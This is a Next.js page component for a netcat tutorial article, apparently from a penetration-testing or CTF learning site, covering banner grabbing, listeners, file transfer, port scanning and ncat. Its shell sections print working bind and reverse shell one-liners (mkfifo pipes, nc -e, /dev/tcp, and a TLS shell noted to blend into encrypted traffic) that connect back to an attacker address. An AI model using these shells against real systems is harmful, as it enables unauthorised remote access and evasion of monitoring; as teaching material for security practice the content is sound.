import type { Metadata } from "next";
import BlogCard from "../../../components/blog/BlogCard";
import CardTerminal from "../../../components/blog/CardTerminal";
import styles from "../../../styles/Blog.module.css";

export const metadata: Metadata = {
  title: "Netcat Essentials",
  description:
    "Netcat (nc) recipes: banner grabbing, listeners, file transfer, bind & reverse shells, port scanning, and ncat with SSL.",
};

export default function NetcatPage() {
  return (
    <div className="site-main">
      <h1 className="page-title">Netcat Essentials</h1>
      <div className={styles.article}>
        <BlogCard heading="What is Netcat?">
          <p>
            Netcat (<code>nc</code>) is the TCP/IP swiss army knife: it reads
            and writes raw bytes across network sockets. Almost every
            Linux/Unix distro ships it, and it is the fastest way to move a
            shell, a file or a single packet between two machines. Two popular
            variants exist: the traditional <b>netcat-traditional</b> and{" "}
            <b>OpenBSD netcat</b> (Kali default), which adds <code>-e</code>{" "}
            only via <code>ncat</code> from the Nmap project.
          </p>
        </BlogCard>

        <BlogCard heading="Banner grabbing & quick connections">
          <p>
            Connect to a TCP port and read whatever the service sends first —
            a quick way to fingerprint an HTTP, SMTP or FTP server.
          </p>
          <CardTerminal title="banner-grab">
            <pre>{`$ nc -nv 10.10.10.5 80
(UNKNOWN) [10.10.10.5] 80 (http) open
HTTP/1.1 408 Request Timeout
Server: Apache/2.4.41 (Ubuntu)`}</pre>
          </CardTerminal>
          <p>
            A full HTTP exchange works the same way{` — `}type or paste the
            request, then press <b>Enter twice</b> to send the blank line that
            ends the headers.
          </p>
          <CardTerminal title="http-request">
            <pre>{`$ nc -nv 10.10.10.5 80
GET / HTTP/1.1
Host: 10.10.10.5
User-Agent: nc

`}</pre>
          </CardTerminal>
        </BlogCard>

        <BlogCard heading="Listeners, chats & file transfer">
          <h3>A simple listener</h3>
          <CardTerminal title="listener">
            <pre>{`$ nc -nvlp 4444        # listen on TCP/4444
#      ││ │└─  local address
#      ││ └─  port to listen on
#      │└─  resolve without DNS
#      └─  numeric output, verbose`}</pre>
          </CardTerminal>
          <p>
            Whatever the client sends is echoed to your terminal, and whatever
            you type goes back{` — `}a two-way chat over TCP.
          </p>

          <h3>Sending a file</h3>
          <CardTerminal title="file-transfer">
            <pre>{`receiver: nc -nvlp 8000 > received_file
sender  : nc -nv 10.10.10.5 8000 < report.pdf

# verify integrity afterwards
receiver: md5sum received_file`}</pre>
          </CardTerminal>
          <p>
            Netcat performs no encryption or integrity checks, so always{" "}
            <code>md5sum</code>/<code>sha256sum</code> on both sides. For
            encrypted channel transfers use <code>ncat --ssl</code> (below) or
            pipe through <code>openssl enc</code>.
          </p>
        </BlogCard>

        <BlogCard heading="Bind &amp; reverse shells">
          <h3>Bind shell — target listens, you connect</h3>
          <CardTerminal title="bind-shell">
            <pre>{`target : rm -f /tmp/f; mkfifo /tmp/f
          cat /tmp/f | /bin/sh -i 2>&1 | nc -lvp 4444 > /tmp/f
attacker: nc -nv 10.10.10.5 4444`}</pre>
          </CardTerminal>

          <h3>Reverse shell — target connects back to you</h3>
          <p>
            The go-to in CTFs because outbound connections usually bypass
            firewalls more easily than inbound ones. Start your listener
            first!
          </p>
          <CardTerminal title="reverse-shell">
            <pre>{`attacker: nc -nvlp 9001
target  : rm -f /tmp/f; mkfifo /tmp/f
          cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.1 9001 > /tmp/f

# OpenBSD nc without a fifo / bash variant
target  : nc -e /bin/sh 10.10.10.1 9001
target  : /bin/sh -i > /dev/tcp/10.10.10.1/9001 2>&1 0>&1`}</pre>
          </CardTerminal>
          <p>
            More one-liners (PowerShell, Python, Perl, ruby, meterpreter…) live
            in the site&apos;s{" "}
            <a className={styles.extLink} href="/resources/reverseshells">
              reverse shell generator
            </a>
            .
          </p>
        </BlogCard>

        <BlogCard heading="port scan &amp; ncat (SSL)">
          <h3>Tiny port scanner</h3>
          <CardTerminal title="scan">
            <pre>{`$ nc -zvn 10.10.10.5 1-1000 2>&1 | grep -v closed
Connection to 10.10.10.5 80 port [tcp/http] succeeded!
Connection to 10.10.10.5 22 port [tcp/ssh] succeeded!`}</pre>
          </CardTerminal>
          <p>
            Fine for quick checks, but for real reconnaissance use{" "}
            <a className={styles.extLink} href="/resources/nmap">nmap</a>.
          </p>

          <h3>ncat — the modern, TLS-capable cousin</h3>
          <CardTerminal title="ncat">
            <pre>{`# server with a self-signed cert, client verifies with --ssl-trustfile
server : ncat -nvlp 8443 --ssl --ssl-cert cert.pem --ssl-key key.pem
client : ncat -nv 10.10.10.5 8443 --ssl

# reverse shell over TLS (blends into encrypted traffic)
target : rm -f /tmp/f; mkfifo /tmp/f
         cat /tmp/f | /bin/sh -i 2>&1 | ncat --ssl 10.10.10.1 8443 > /tmp/f`}</pre>
          </CardTerminal>
        </BlogCard>
      </div>
    </div>
  );
}
